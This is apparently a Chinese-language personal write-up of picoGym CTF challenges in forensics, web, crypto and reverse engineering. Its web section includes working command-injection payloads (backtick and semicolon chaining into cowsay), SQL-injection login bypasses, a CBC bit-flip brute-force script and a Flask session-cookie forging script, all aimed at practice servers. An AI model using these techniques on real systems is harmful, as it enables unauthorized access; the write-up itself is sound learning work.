# picoGym 记录

## Misc

### tunnel_vision

下载下来是一个没有后缀的文件，010Editor打开发现文件头为`42 4D`，查询后得知是`.bmp`文件的文件头，改名后打开发现无法正常显示说明位图元数据被篡改了，用010的bmp模板发现`bfOffBits`和`biSize`两个数据异常大（`53434`），而正常应该为`54`和`40`（`BITMAPFILEHEADER` 14 Bytes, `BITMAPINFOHEADER` 40 Bytes）

修改后打开，发现是假flag，联想到题目名，将位图元数据的`biHeight`修改为较大值，打开后获得最终的flag~

### MacroHard WeakEdge

总之用PowerPoint打开什么有用信息都找不到，遂想到ppt本质上是压缩包，解压后`tree -ah` 发现了`/slideMaster/hidden`这个文件，打开后是一串文本：

```text
Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q
```

用Python的split拼接成字符串，base64解码得到flag

## Forensics

### Trival Flag Transfer Protocol

题目给了一个`tftp.pcapng`，表明了这道题与TFTP协议有关，TFTP是简单的文件传输协议，不对文件进行任何加密，所以若抓包完整是可以完整还原文件的。

Wireshark自带导出TFTP文件的功能（一开始不知道还傻愣愣的等追踪UDP流，属实呃呃）

Wireshark: `文件 > 导出对象 > TFTP`，`Save all`即可导出全部文件。

文件如下：

```shell
> tree
.
├── instructions.txt
├── picture1.bmp
├── picture2.bmp
├── picture3.bmp
├── plan
├── program.deb
```

`instructions.txt`和`plan`两个文件的内容都是凯撒密码，暴力解密后得知flag藏在了图片中。如果经验充足的话一般会想到`steghide`，而出题人也很贴心，`program.deb`通过`alien -r`导出为`steghide-0.5.1-10.1.x86_64.rpm`，OK没跑了~

`plan`文件还提示到密钥可能为`DUEDILIGENCE`，只有`picture3.bmp`可以被该密钥解密，且为正确flag。（不知道1，2是干嘛用的，欣赏风景罢）

### Wireshark twoo twooo two twoo...

这道题属实呃呃了，不细看还真难看出来......烂题

Wireshark打开pcapng文件，为HTTP类型，发现了`GET /flag HTTP/1.1`的Header（然而不止一个请求和响应），各个响应里面有`picoCTF{一串意义不明的hash}`试了两个都不行，LIAR😑

发现DNS协议总是在查找域为`reddshrimpandherring.com`的服务器 ，访问无果，又注意到（并没有）多次查找子域名都不同，还出现了带`==`号的子域名，原来是base64！

然而实在是太多了，多次过滤排序后发现`192.168.38.104 -> 18.217.1.57`的DNS查询比较特别而且请求少，将它们的子域名拼接起来得到`cGljb0NURntkbnNfM3hmMWxfZnR3X2RlYWRiZWVmfQ==` Base64解码即可

### advanced-potion-making

使用 `file` 发现无法识别文件头，估计是文件头被破坏了，010editor打开，看到熟悉的IHDR就知道，这是png文件，将文件头修复后得到一张纯红色的图片，但是观察二进制数据发现并非全部是一种颜色，所以可能是有什么颜色信息被覆盖了，直接stegsolve整上，Red Plane 0时即为flag。

flag: `picoCTF{w1z4rdry}`



flag: `picoCTF{imag3_m4n1pul4t10n_sl4p5}`



### Disk, disk, sleuth! II

懒得用qemu加载镜像了，因为提示用`sleuthkit`为何不用？

`autopsy` 是 `sleuthkit` 的 WebUI，比命令行方便许多

文件查找 `down-at-the-bottom.txt` 即可获得答案

flag: `picoCTF{f0r3ns1c4t0r_n0v1c3_db59daa5}`



## Web

### Cookies

查看页面的cookie，发现有个`name` 值为整数，控制台输入`document.cookie="name=0"`发现页面文字变化，尝试不同的name值，最终在name=18时找到flag

### More Cookies

这道题有点离谱了，看了别人的writeup才做得出来。

提示指向[Homomorphic Encryption的维基页面](https://en.wikipedia.org/wiki/Homomorphic_encryption) 暗示不用解密，只需要推测出其判定方式修改现有的密文（Cookies）即可绕过，这里有个很坑的点，非英语母语者可能很难发现题目中，**C**ookies can **B**e modified **C**lient-side 三个字母异常大写，CBC即**Cipher block chaining** 最常见的加密方式是位翻转（Bitflip）即将其中一位异或某个数，也就是说Cookies中有一位决定了是否为admin（总之就是特别靠猜，并且除了暴力遍历并request没有其他更好的方法，所以31%的like也挺正常）

**Python Script:**

```python
from base64 import b64decode, b64encode
import requests

cookies = "a09HQUFYVTFVSmF4UUZkUXRGQkgwcUwwU1ZYSHBtNUlrSG5hRDAvOFpJa0VCNGI3c2YrVExXd3RsOFFpd01aZm5DanMxMjVCUDFqSG5Pa21FbGd2NmRwbktFSkRxTmRjdFAzSC9HQ1ZmS1lKN0o4WkNlTktJNGN0Si9VcU1MbFM=" #随便开一次网页获取

def bitFlip(pos, bit, data):
    raw = b64decode(data).decode()
    list1 = list(raw)
    list1[pos] = chr(ord(list1[pos]) ^ bit)
    raw = ''.join(list1).encode()
    return b64encode(raw).decode()

for i in range(128):
    for j in range(128):
        temp_cookies = bitFlip(i, j, cookies)
        send_cookies = {'auth_name': temp_cookies}
        r = requests.get("http://mercury.picoctf.net:43275/", cookies=send_cookies)
        if "picoCTF{" in r.text:
            print(r.text)
            break
```

flag: `picoCTF{cO0ki3s_yum_1b75d657}`

### Most Cookies

这道题的admin认证采用了flask的session cookies，还给出了源代码，知道了密钥就是cookies_names数组中的字符串之一，只要遍历尝试即可获得密钥，而flask是如何通过密钥和cookies计算出最终的session cookies，这就要到flask源码中的sessions.py中寻找答案，功力不足，照抄了别人的代码。

得到密钥后，就可以使用 `{"very_auth": "admin"}` 替代原本的cookie（这里我没有使用request，直接用Burp intercept/Forward，python应该也是可以实现intercept的，但是我对request.session不太了解用法，遂作罢）

**Python Script:**

```python
import re
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt, serializer=self.serializer, signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    try:
        return signingSerializer.loads(cookieValue)
    except:
        return "NOPE"

    # Keep in mind that flask uses unicode strings for the
    # dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
    sscsi = SimpleSecureCookieSessionInterface()
    signingSerializer = sscsi.get_signing_serializer(secret_key)
    return signingSerializer.dumps(cookieDict)

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz","snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

cookie = "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Yw9kog.CE-DILhhSZCNjRr8Y-6VWmJNPDo" # change to your own session cookie

for sk in cookie_names:
    decodedDict = decodeFlaskCookie(sk, cookie)
    if "very_auth" in decodedDict:
        print("Found it! The secret key is: " + sk)
        new_cookies = encodeFlaskCookie(sk, {"very_auth": "admin"})
        print("New cookies: " + new_cookies)

```



flag: `picoCTF{pwn_4ll_th3_cook1E5_5f016958}`

### Some Assembly Required 1

通过这道题才知道有WebAssembly这种东西呢...

在DevTools中找到页面调用的js，发现被混淆的很厉害，先用http://jsnice.org/初步反混淆，发现`_0x5c00`这个函数读入索引，计算后返回`_0x6d8f`这一字符串表的一项，也就是说想要还原就需要使用这个函数不断替换，在控制台定义这个函数就可以调用函数了：

```js
>>> const func = _0x5c00;
undefined
>>> func(200)
"233ZRpipt" 
```

剔除掉前面的一些检测过程，替换得到：

```js
(async() => {
  const findMiddlePosition = _0x4e0e;
  let leftBranch = await fetch("./JIFxzHyW8W");
  let rightBranch = await WebAssembly["instantiate"](await leftBranch["arrayBuffer"]());
  let module = rightBranch["instance"];
  exports = module["exports"];
})();
/**
 * @return {undefined}
 */
function onButtonPress() {
  const navigatePop = _0x4e0e;
  let params = document["getElementById"]("input")["value"];
  for (let i = 0; i < params["length"]; i++) {
    exports["copy_char"](params["charCodeAt"](i), i);
  }
  exports["copy_char"](0, params["length"]);
  if (exports["check_flag"]() == 1) {
    document["getElementById"]("result")["innerHTML"] = "Correct!";
  } else {
    document["getElementById"]("result")["innerHTML"] = "Incorrect!";
  }
}
;
```

其实也不需要全部替换，在`async`中就能知道`./JIFxzHyW8W`是一个wasm文件，下载并改名得到wasm文件，下面有个`copy_char`是从wasm中export出来的，所以我们用jeb反汇编一下，可以看到层级中有三个函数，二话不说直奔`check_flag`，然后解析，明文flag直接出现。

flag: `picoCTF{cb688c00b5a2ede7eaedcae883735759}`

### Some Assembly Required 2

网页js与上题没有区别，区别在于wasm中的flag并非明文，所以这时就要看看`copy_char`的区别了，

```c
// 1
void copy_char(unsigned int param0, unsigned int param1) {
    unsigned int v0 = g0 - 16;
    *(v0 + 12) = param0;
    *(v0 + 8) = param1;
    *(*(v0 + 8) + 1072) = (unsigned char)(*(v0 + 12));
}

// 2
void copy_char(unsigned int param0, unsigned int param1) {
    unsigned int v0 = g0 - 16;
    *(v0 + 12) = param0;
    *(v0 + 8) = param1;

    if(*(v0 + 12) != 0) {
        *(v0 + 12) = *(v0 + 12) ^ 8;
    }

    *(*(v0 + 8) + 1072) = (unsigned char)(*(v0 + 12));
}

```

显而易见，2的`copy_char`会将char字符异或8返回，而js中对每个字符调用了`copy_char`，ok直接异或回去

```python
enc = "xakgK\\\\Ns><m:i1>1991:nkjl<ii1j0n=mm09;<i:u"

for i in range(len(enc)):
    print(chr(ord(enc[i]) ^ 8), end="")
```

flag: `picoCTTF{64e2a9691192fcbd4aa9b8f5ee8134a2}`

### Logon

题目描述中写到要以Joe身份登录，但是没有密码，发现除了用户名Joe以外，其他用户随便输入都能进入，但是提示“No flag for you.”

发现cookie中明文存储着`username`和`password`以及`admin`布尔值，那么就尝试在登录后的界面修改这些值就好了，`document.cookie="username=Joe;path=/"`和`document.cookie="admin=True;path=/"`即可获得flag（注意这里的path，因为登录界面为子页面，不加上根页面的path无效）

### It is my Birthday

题目描述要求两个PDF文件内容不同但是MD5相同，鉴于我找不到这样的PDF文件，于是我直接在网上下载了现成的两个内容不同MD5相同的exe程序并直接改后缀为.pdf

[https://www.mathstat.dal.ca/~selinger/md5collision/](https://www.mathstat.dal.ca/~selinger/md5collision/)

上传后直接给出`highlight_file("index.php");`

里面检测文件类型的方法是`$_FILES["file1"]["type"] == "application/pdf"`

经查阅了解到php文件type是直接检测后缀名的，而非通过文件头，所以直接改后缀也可以过

### Who are you?

很有意思的题，考你对HTTP Headers的记忆

分别加上这些Headers：

`User-Agent: PicoBrowser` 

`Referer: mercury.picoctf.net:34588`

`Date:  Sun, 06 Nov 2018 08:49:37 GMT`

`DNT: 1`

`X-Forwarded-For: 31.3.152.55`

`Accept-Language: sv,en;q=0.9`

### caas

好活

网上查到的源代码：

```js
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});
```

做题的时候以为picoctf给的index.js和网站上的一样的，纯纯的无语了，原来不一样，所以我是纯盲注的：

```
https://caas.mars.picoctf.net/cowsay/*
>>>
 __________________________________
/ Dockerfile falg.txt index.js     \
| node_modules package.json public |
\ yarn.lock                        /
 ----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
                
https://caas.mars.picoctf.net/cowsay/`cat falg.txt`
>>>
 _________________________________________
/ picoCTF{moooooooooooooooooooooooooooooo \
\ oooooooooooooooooooooooooooooo0o}       /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

https://caas.mars.picoctf.net/cowsay/Stupid Human.; ls -alh && cat falg.txt
>>>
 _______________
< Stupid Human. >
 ---------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
total 52K
drwxr-xr-x  1 root root 4.0K Jun 16  2021 .
drwxr-xr-x  1 root root 4.0K May  6 10:21 ..
-rw-r--r--  1 root root   14 May  5  2021 .dockerignore
-rw-r--r--  1 root root  278 May  5  2021 Dockerfile
-rw-r--r--  1 root root   73 May  5  2021 falg.txt
-rw-r--r--  1 root root  424 Jun 16  2021 index.js
drwxr-xr-x 52 root root 4.0K May  5  2021 node_modules
-rw-r--r--  1 root root  135 May  5  2021 package.json
drwxr-xr-x  2 root root 4.0K May  5  2021 public
-rw-r--r--  1 root root  15K May  5  2021 yarn.lock
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

看了源代码就知道什么原理了，用反引号`` ` escape掉前面的命令，分号重新起一行系统命令。



### Web Gauntlet 2

该学学SQL注入了，遇到这种题只能到处查各种SQL注入方法，然后就忘了，，，

题目很良心的给出了filter（毕竟是mini比赛，没必要搞太难）：

`"or", "and", "true", "false", "union", "like", "=", ">", "<", ";", "--", "/*", "*/", "admin"`

好家伙，真绝，但是貌似没有禁符号逻辑运算符（文字的倒是禁了）

然后页面也很贴心的把每次的SQL语句显示出来：

`SELECT username, password FROM users WHERE username='asdf' AND password='asdf'`

盲猜这两个是简单的布尔判断，payload：

username: `a'||'dmin`

password: `a' IS NOT b'`

## Crypto

### mind your Ps and Qs

[RSA算法](https://www.ruanyifeng.com/blog/2013/07/rsa_algorithm_part_two.html)中，e一般取65537（越大越好，但是考虑到加密解密的过程耗时），N一般取1024位/2048位二进制，该题中N只有269位，给了我们很大的暴力破解空间

实际上就是暴力因数分解N（FactorDB）得到PQ

P、Q => Φ(N)

Φ(N)、e => d

c、d、n => m

m即为原文（ASCII）

**python script:**

```python
from Crypto.Util.number import inverse, long_to_bytes
c = 421345306292040663864066688931456845278496274597031632020995583473619804626233684
n = 631371953793368771804570727896887140714495090919073481680274581226742748040342637
e = 65537
p = 1461849912200000206276283741896701133693
q = 431899300006243611356963607089521499045809 # get from FactorDB!

phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)

print(str(long_to_bytes(m)))
```

flag: `picoCTF{sma11_N_n0_g0od_55304594}`

### morse-code

就是用可以看频谱的软件转写摩尔斯电码，较大的间隔用下划线代替

flag: `picoCTF{wh47_h47h_90d_w20u9h7}` （有一说一，这个原文本已经被leet得看不出原样了，，，） 

### Dachshund Attacks

这里玩了个双关文字游戏，Dachshund是腊肠狗，而Wiener不仅是人名，也是香肠的意思，再加上提示d比较小，所以联想到利用Wiener's Attack破解

具体原理等我深入学习再说，，，

flag: `picoCTF{proving_wiener_3878674}`

### Mini RSA

RSA中e一般取65537，但是如果e非常的小，那么爆破也是有可能的

RSA中 `M**e mod n = c` e取3，则可以写成 `M**3 = tn + c` 只要找到整数t使得式子成立，即可获得M（明文），题目提示`M**e`比n大不了多少，所以爆破花不了多少时间

这里使用gmpy2库以实现精确计算，而不需要设置精确度等参数，使用iroot计算`(tn+c)**1/3`

**Python Script:**

```python
from gmpy2 import iroot

c = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106
n = 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287
e = 3

for i in range(5000):
    m, true_root = iroot(i*n+c, e) // iroot(x,n) returns a 2-element tuple (y, b) such that y is the integer n-th root of x and b is True if the root is exact.
    if true_root:
        print(bytes.fromhex(format(m,'x')).decode())
        break

```

flag: `picoCTF{e_sh0u1d_b3_lArg3r_7adb35b1}`



### spelling-quiz

分析了一下加密代码，发现就是简单的替代密码，就是要获得随机生成的字典太难了，题目给了一个很大的数据 `study-guide.txt`，分析一下出现最多的字母，发现r频率最高，也就是`r=e`，接下来可以使用https://www.quipqiup.com/ 来破解（当然理论上把全部字母试过去也可以得到，不用分析频率，而且网站也提供一个频率破解，虽然密文很短但是也能得出答案）

flag: `picoCTF{perhaps_the_dog_jumped_over_was_just_tired}`

### Double DES

通过该题了解到了`Meet-in-the-Middle Attack`！

题目给了源代码，分析了解到flag由两个随机密钥（6位数字加上2位pad）分别两次DES加密后输出，密钥的长度如此的短，让遍历尝试成为可能。

而输出加密了的flag后，程序要求输入，并用相同的两个密钥加密后输出，已知明文和密文的话就可以暴力试出两个密钥了。

然而如果单纯的两个for循环遍历0~999999，那暴力破解的时间复杂度可谓是灾难，这时候就考虑到MitM攻击：

让程序加密`123456`（注意这里很坑，源程序只允许输入纯数字并且要偶数位，`"123456"`会转换成`b'\x12\x34\x56'`，而不是`“123456”`对应的ascii值），获取密文`enc`；

第一次循环，将`“123456”`枚举密钥**加密**，并用字典`big_table`存储每一个键值对`{enc_value:key}`缩小密钥空间；

第二次循环，将`enc`枚举密钥**解密**，如果最后得出的`candidate_pt`能在`big_table`中找到相同的键，则把该键的值（也就是第一个密钥`key1`）与枚举到的密钥`key2`包装成键值对放入`potential_keys`数组中；

最后用这两个密钥解密`enc_flag`即可，通过mitm攻击**极大地**降低了枚举的次数（只需要2*1000000而不是1000000^2）

吐槽一下python

```python
from Crypto.Cipher import DES
import itertools
from pwn import *
import binascii

def pad(msg):
    block_len = 8
    over = len(msg) % block_len
    pad = block_len - over
    return str(msg + " " * pad).encode("utf-8")

p = remote("mercury.picoctf.net", 37751)
p.recvuntil("Here is the flag:\n")
enc_flag = p.recvline().decode("utf-8").strip()
p.recvuntil("What data would you like to encrypt? ")
p.sendline('123456')
enc = p.recvline().decode("utf-8").strip()
p.close()

big_table = {}
potential_keys = []

for i in itertools.product(string.digits, repeat=6):
    key = pad(''.join(i))
    value = binascii.hexlify(DES.new(key, DES.MODE_ECB).encrypt(pad("123456"))).decode()
    big_table[value] = key
for i in itertools.product(string.digits, repeat=6):
    key = pad(''.join(i))
    candidate_pt = binascii.hexlify(DES.new(key, DES.MODE_ECB).decrypt(binascii.unhexlify(enc))).decode()
    if candidate_pt in big_table:
        potential_keys.append({big_table[candidate_pt], key})

for (key1, key2) in potential_keys:
    try:
        enc1 = DES.new(key2, DES.MODE_ECB).decrypt(binascii.unhexlify(enc_flag))
        flag = DES.new(key1, DES.MODE_ECB).decrypt(enc1)
        print(flag.decode())
        break
    except:
        continue

```

*`9af5126b7bc7f825b3cae0e32bd1acb4`

## Reverse

### ARMssembly 1

纯考ARM汇编的题，如果对ARM汇编熟悉的这道题非常简单，不懂的我查了半天的code sheet/manual，令人感叹（btw，感觉这种题没啥意思）

题目问是什么参数使得程序能够打印出"You win!"，那就逆向思维倒推就行

注意，题目数字会变，flag也会随之改变，所以还是按照自己下载到的文件去分析，我这里只分析2022/8/31时的题目

分析main函数过后得知，func函数返回时，w0要等于0，所以到func函数中倒推其参数：

```assembly
func:
	sub	sp, sp, #32
	str	w0, [sp, 12] // [sp, 12] = arg
	mov	w0, 81  // w0 = 81
	str	w0, [sp, 16] // [sp, 16] = 81
	str	wzr, [sp, 20] // [sp, 20] = 0
	mov	w0, 3 // w0 = 3
	str	w0, [sp, 24] // [sp, 24] = 3
	ldr	w0, [sp, 20] // w0 = 0
	ldr	w1, [sp, 16] // w1 = 81
	lsl	w0, w1, w0 // w0 = w1 << w0 = 81
	str	w0, [sp, 28] // [sp, 28] = 81
	ldr	w1, [sp, 28] // w1 = 81
	ldr	w0, [sp, 24] // w0 = 3
	sdiv	w0, w1, w0 // w0 = w1 / w0 = 27
	str	w0, [sp, 28] // [sp, 28] = 27
	ldr	w1, [sp, 28] // w1 = 27
	ldr	w0, [sp, 12] // w0 = arg
	sub	w0, w1, w0 // w0 = 27 - arg, so arg need to be 27
	str	w0, [sp, 28]
	ldr	w0, [sp, 28]
	add	sp, sp, 32
	ret
	.size	func, .-func
	.section	.rodata
	.align	3
```

arg = 27 ，所以flag就为arg转换为32bits的HEX，即为0000001b

flag: `picoCTF{0000001b}`

### ARMssembly 2

上一道题的加强版，题目给了 `2610164910` 这个整数作为参数，问最后的输出的整数为多少，这个数字大于有符号32位整数的范围（小于无符号32位整数范围），所以大概率会涉及到正/负溢出的问题，逆向分析发现循环体L2与L3基本如以下C代码所示（Python动态类型搞起来麻烦，不如用静态类型的c），发现基本就是**每次循环sp+24内存位置的数据（简称sp24，下同）加3，sp28加1，直到sp28>=参数，此时的sp24就是最后的输出**，注意到，所有的循环都是使用w0/w1这样的32位寄存器，所以 `sp24 = 2147483646` 下一次就会溢出到负数，接下去负数又会慢慢变大回到整数，此题只溢出了一次，使用计算器进行计算即可（逆向模拟不现实也没必要）：

**CPP Code:**

```cpp
#define ll long long

ll goal = 2610164910;
ll sp24 = 2147483646; 
ll sp28 = 715827882;
int w0 = 0;
int w1 = 0;
for ( int i = 0 ; i<20 ; i++ ) {
    w0 = sp24;
    w0 += 3;
    sp24 = w0;
    w0 = sp28;
    w0 += 1;
    sp28 = w0;
    w1 = sp28;
    w0 = goal;
    if (w1 >= goal) {
        w0 = sp24;
        break;
    }
    cout << sp24 << " " << sp28 << endl;
}
cout << w0;
```

flag: `picoCTF{d2bbde0a}`

### ARMssembly 3

题目给的是`469937816`这个整数，数字可能会发生变化，flag也可能随之变化，请注意。

同上，也是一样分析成C代码，不过这道题有点复杂，涉及到了循环，需要仔细地思考。

C代码基本照抄汇编代码，没有经过什么简化，可能挺啰嗦的，不过好处在可以很好地还原汇编码的操作而不会缺胳膊少腿：

```cpp
#include <iostream>

int func1(int w0){
    int x29_44 = 0;
    int x29_28 = w0;
    if ( w0 != 0 )
    {
        while (w0 != 0)
        {
            w0 = x29_28;
            if ( w0 == 0 ) break;
            w0 = x29_28;
            w0 = w0 & 1;
            if ( w0 != 0 ) {
                w0 = x29_44;
                w0 += 3;
                x29_44 = w0;
            }
            w0 = x29_28;
            w0 = w0 >> 1;
            x29_28 = w0;
        }
    }
    w0 = x29_44;
    return w0;
}

int main() {
    int w0 = 469937816;
    printf("%x",func1(w0));
    return 0;
}
```

懒得分析具体的过程了，没什么意义，最后的结果正确即可。

flag: `picoCTF{00000024}`

### Hurry up! Wait!

很无语的逆向题，会用ida就会做，就是用一堆函数一个一个打印出flag，大概就是考验你对disassemble的熟练程度吧

flag: `picoCTF{d15asm_ftw_87e5ab}`

### gogo

基础逆向题，elf文件是golang编译的，但是对逆向影响不大。

或许是golang特点，函数都有前缀，特别方便确定函数类型。直接找main函数，发现有`main_checkPassword`和`main_get_flag`两个内容丰富的函数。既然是nc远程获得flag的题，就老老实实先看看密码是什么吧。

`main_checkPassword` 函数检测输入，输入小于32个字符就退出，输入字符串异或一个神秘char数组（位于esp+24h）要等于key:`861836f13e3d627dfa375bdb8389214e`

这里的char数组我实在找不到哪个函数放进去的，只能直接gdb整上了（remote gdb server不知道为啥不能响应，sad）。

保险起见，在异或循环开始的时候打断点

```shell
.text:080D4B0F                 cmp     eax, 20h ; ' '

gdb-peda$ b *0x80d4b0f
gdb-peda$ x/32bcx $esp+36
0x18449f48:     0x4a    0x53    0x47    0x5d    0x41    0x45    0x03    0x54
0x18449f50:     0x5d    0x02    0x5a    0x0a    0x53    0x57    0x45    0x0d
0x18449f58:     0x05    0x00    0x5d    0x55    0x54    0x10    0x01    0x0e
0x18449f60:     0x41    0x55    0x57    0x4b    0x45    0x50    0x46    0x01
```

异或是最简单的逆向捏：

```python
enc = [0x4a,    0x53,    0x47,    0x5d,    0x41,    0x45,    0x03,    0x54,
       0x5d,    0x02,    0x5a,    0x0a,    0x53,    0x57,    0x45,    0x0d,
       0x05,    0x00,    0x5d,    0x55,    0x54,    0x10,    0x01,    0x0e,
       0x41,    0x55,    0x57,    0x4b,    0x45,    0x50,    0x46,    0x01]
key = "861836f13e3d627dfa375bdb8389214e"

for i in range(0, len(enc)):
    enc[i] = chr(enc[i] ^ ord(key[i]))
print("".join(enc))

>>> reverseengineericanbarelyforward
```

输入password的时候，奇怪了：

```shell
Enter Password: reverseengineericanbarelyforward
=========================================
This challenge is interrupted by psociety
What is the unhashed key?
```

咋还要给没有哈希过的key呢，呃呃了。

如果是简单的哈希函数的话，直接字典查找就行，考虑到key只有32个字符（128位），应该不难。

可以用ida的`FindCrypt`插件查找关于哈希的函数，只找到了md5，so，easy peasy。

`md5(goldfish) = 861836f13e3d627dfa375bdb8389214e`

flag: `picoCTF{p1kap1ka_p1c09a4dd7f3}`



### Let's get dynamic

虽然提示用gdb调试，但是最后还是得要静态分析，，，

chall.S 先用gcc编译出elf文件，然后gdb调试：

```shell
gcc chall.S -o program
gdb program

gdb-peda$ b main
gdb-peda$ r
```

```asm
00:0000│ rsp 0x7fffffffda00 —▸ 0x7fffffffdc28 —▸ 0x7fffffffdeb9 ◂— '/mnt/d/CTF/picoGym/Lets_get_dynamic/a.out'
01:0008│     0x7fffffffda08 ◂— 0x100000340
02:0010│     0x7fffffffda10 ◂— 0x34000000340
03:0018│     0x7fffffffda18 ◂— 0x1200000340
04:0020│     0x7fffffffda20 ◂— 'picoCTF{dyn4m1c_4n'
05:0028│     0x7fffffffda28 ◂— 'dyn4m1c_4n'
06:0030│     0x7fffffffda30 ◂— 0x34000006e34 /* '4n' */
07:0038│     0x7fffffffda38 ◂— 0x34000000340
```

多次 `n` 下一步，发现堆栈里出现了部分flag内容：`picoCTF{dyn4m1c_4n`，但是继续步进后发现后面的部分不再出现，遂直接ida分析。

分析发现程序使用两个存储Hex值的数组（这里反汇编伪代码有点出入，v7跟v14一样为长度7的int64数组，v15其实是v14[6]），按字节相同索引值读取，通过一系列的异或操作得到flag（这里有个挺坑的点，字面量整数是大端，内存存储是小端，后续逆向需要注意reverse）。

```v
*(_QWORD *)v7 = 0xFD872AC7CA737102LL;
v8 = 0x4915F12BF9F82DCBLL;
v9 = 0xA7EF0D4C54003C10LL;
v10 = 0x9399CCF74D02A843LL;
v11 = 0x2AC6F818989688D7LL;
v12 = 0x9F51EBCA33584C85LL;
v13 = 231;
v14[0] = 0x92D46893B5010A61LL;
v14[1] = 0xA6BDE59D58F4EB4LL;
v14[2] = 0xFC993A3238355027LL;
v14[3] = 0xEDA7B28D7054D179LL;
v14[4] = 0x419FBB499BD4CFBBLL;
v14[5] = 0x935AE3903F554688LL;
v15 = 185;
...
for ( i = 0; i < strlen(v7); ++i )
s2[i] = *((_BYTE *)v14 + i) ^ v7[i] ^ i ^ 19;
...
```

注意到堆栈中的flag过短的原因是`strlen(v7)` strlen读到0x00就会结束，而v9 = 0xA7EF0D4C54**00**3C10，所以我们可以通过编写逆向程序：

```python
v7 = [None] * 7
v7[0] = "FD872AC7CA737102"
v7[1] = "4915F12BF9F82DCB"
v7[2] = "A7EF0D4C54003C10"
v7[3] = "9399CCF74D02A843"
v7[4] = "2AC6F818989688D7"
v7[5] = "9F51EBCA33584C85"
v7[6] = "E7"

v7Array = []
for s in v7:
    temp = []
    for i in range(0, len(s), 2):
        temp.append(s[i:i+2]) # read hex as bytes
    temp.reverse() # make array little-endia
    v7Array += temp

v14 = [None] * 7
v14[0] = "92D46893B5010A61"
v14[1] = "0A6BDE59D58F4EB4"
v14[2] = "FC993A3238355027"
v14[3] = "EDA7B28D7054D179"
v14[4] = "419FBB499BD4CFBB"
v14[5] = "935AE3903F554688"
v14[6] = "B9"

v14Array = []
for s in v14:
    temp = []
    for i in range(0, len(s), 2):
        temp.append(s[i:i+2])
    temp.reverse()
    v14Array += temp

flag = []
for i in range(len(v7Array)):
    flag.append(chr(int(v7Array[i], 16) ^ int(v14Array[i], 16) ^ i ^ 19))
print("".join(flag))
```

或者patch程序将判断条件改为flag长度（6*8+1=49）：

```asm
.text:00000000000012CA                 cmp     rbx, 31h ; '1'  ; Keypatch modified this from:
.text:00000000000012CA                                         ;   call _strlen
.text:00000000000012CA                                         ; Keypatch padded NOP to next boundary: 1 bytes
.text:00000000000012CE                 nop
.text:00000000000012CF                 nop
.text:00000000000012D0                 nop
.text:00000000000012D1                 nop
.text:00000000000012D2                 jb      short loc_1275
```

使用ida的keypatch插件（自带的太拉垮了）将 rbx 与 49 cmp，注意好指令长度，不要把jb给nop掉。

应用patch到输入文件，这时再用gdb，在将近结束的地方打断点，就能在 $rsp+32 处得到flag

flag: `picoCTF{dyn4m1c_4n4ly1s_1s_5up3r_us3ful_6044e660}`

## Pwn

### Unsubscriptions Are Free

入门级pwn题，给出了C源代码比逆向伪代码更好阅读。

基本思路：程序每次循环打印菜单并读入用户输入，将需要执行的函数地址放入 `user->whatToDo` 中，并通过 `doProcess()` 跳转。

其中 `hahaexploitgobrrr()` 为后门函数，直接打印出flag；`s()` 函数会打印出后门函数的地址；`leaveMessage()` 先malloc 8个字节然后read；`i()` 会free掉结构体`user`，即清空`whatToDo`/`username`。

